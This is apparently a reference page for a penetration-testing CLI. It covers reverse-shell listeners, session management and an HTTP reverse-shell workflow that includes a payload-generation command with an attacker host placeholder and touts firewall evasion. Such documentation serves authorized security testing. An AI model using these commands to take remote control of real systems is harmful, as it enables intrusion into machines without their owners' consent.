# access shell

> Manage remote shell sessions and listeners

## Commands

```
rb access shell <verb> [args] [flags]
```

| Verb | Description |
|------|-------------|
| `create` | Start a listener to catch reverse shells |
| `listen` | Alias for create |
| `sessions` | List active shell sessions |
| `connect` | Drop into an interactive session |
| `kill` | Terminate a session |

## Usage Examples

### Start a Listener

```bash
# TCP listener on port 4444
rb access shell create 4444 --protocol tcp

# HTTP listener on port 8080
rb access shell create 0.0.0.0:8080 --protocol http

# HTTPS listener
rb access shell create 0.0.0.0:443 --protocol http --ssl

# Alias: listen
rb access shell listen 4444
rb access shell listen 8080 --protocol http
```

### Manage Sessions

```bash
# List all active sessions
rb access shell sessions

# Connect to session
rb access shell connect 1

# Kill session
rb access shell kill 2
```

## Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-p, --protocol` | Listener protocol: tcp, http | tcp |
| `--ssl` | Enable SSL/TLS | false |
| `--background` | Run listener in background | false |

## Session Output

```
Active Shell Sessions
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ID  TYPE      TARGET IP       CONNECTED    LAST SEEN
1   tcp       10.10.10.5      00:05:23     Now
2   http      192.168.1.50    00:12:01     5s ago
3   http      192.168.1.51    00:01:45     15s ago
```

## HTTP Reverse Shell Architecture

The HTTP listener works with `http-shell` payloads from the `exploit` domain.

**Workflow:**

1. **Start HTTP Listener:** `rb access shell listen 8080 --protocol http`
2. **Generate Payload:** `rb exploit payload http-shell --lhost <attacker_ip> --lport 8080`
3. **Execute Payload:** Run the payload on the target
4. **Session Registration:** Target connects back, registering a new session
5. **Polling:** Target periodically polls `/cmd/<id>` for instructions
6. **Interaction:** Commands are queued, target fetches and executes them

**Benefits:**

- **Firewall Evasion**: Uses standard HTTP traffic (ports 80/8080/443)
- **Resilience**: Stateless connection; shell resumes when connectivity returns

## Interaction Notes

- **TCP Shells**: Raw socket connection. Upgrade to PTY for full terminal experience
- **HTTP Shells**: Pseudo-shell interface with async command/output handling
